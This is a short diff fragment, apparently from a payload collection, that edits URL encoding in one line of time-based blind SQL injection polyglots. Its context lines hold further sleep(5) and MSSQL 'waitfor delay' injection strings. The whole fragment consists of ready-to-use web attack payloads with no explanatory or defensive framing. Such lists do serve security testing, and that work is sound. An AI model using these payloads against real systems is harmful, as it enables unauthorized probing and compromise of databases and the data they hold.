@@ -12,7 +12,7 @@ payload
 
 `5%0a-%0asleep(5)/*'-%0asleep(5)-%0a'"-%0asleep(5)-%0a"*/`
 
-`5%2b-%20sleep(5)/*'-%20sleep(5)-%20'"-%20sleep(5)-%20"*/`
+`5%2b-sleep(5)/*'-sleep(5)-'"-sleep(5)-"*/`
 
 `') waitfor delay '0:0:5' --`
 `) waitfor delay '0:0:5' --`
